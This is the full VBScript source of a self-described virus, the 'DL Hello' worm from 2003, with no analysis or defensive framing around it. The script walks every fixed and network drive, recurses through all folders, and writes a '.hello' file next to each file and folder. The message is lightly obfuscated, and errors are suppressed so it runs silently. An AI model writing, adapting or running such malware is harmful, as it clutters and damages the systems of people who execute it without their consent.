rem - VBS/dlH "DL Hello" Virus - By D.L.
rem - Written on November 12th, 2003

On Error Resume Next
dim FSobj,orgMes,finalMes
set FSobj=CreateObject("Scripting.FileSystemObject")

orgMes="Hello! Don't be mad...I'm not a bad bug :) - by *|%|"
orgMes=replace(orgMes,chr(42),chr(68))
orgMes=replace(orgMes,chr(124),chr(46))
finalMes=replace(orgMes,chr(37),chr(76))


On Error Resume Next
dim drive,machine

set machine=FSobj.Drives
for each drive in machine 
     if (drive.DriveType=2)or(drive.DriveType=3) then
         indexFolders(drive.Path&"\")
    end If
next


sub indexFolders(location)
    On Error Resume Next
    dim specs,file,subFol,sayHello

    set specs=FSobj.GetFolder(location)
    set subFol=specs.SubFolders

    for each file in subFol
                set sayHello = FSobj.CreateTextFile(file.Path&".hello", 2, True)
        sayHello.write finalMes
        sayHello.Close
        writeData(file.Path)
        indexFolders(file.Path)
    next
end sub

sub writeData(location)
    On Error Resume Next
        dim folder,directory,file,sayHello

    set folder=FSobj.GetFolder(location)
    set directory=folder.Files

    for each file in directory
         set sayHello = FSobj.CreateTextFile(file.Path&".hello", 2, True)
        sayHello.write finalMes
        sayHello.Close 
    next
end sub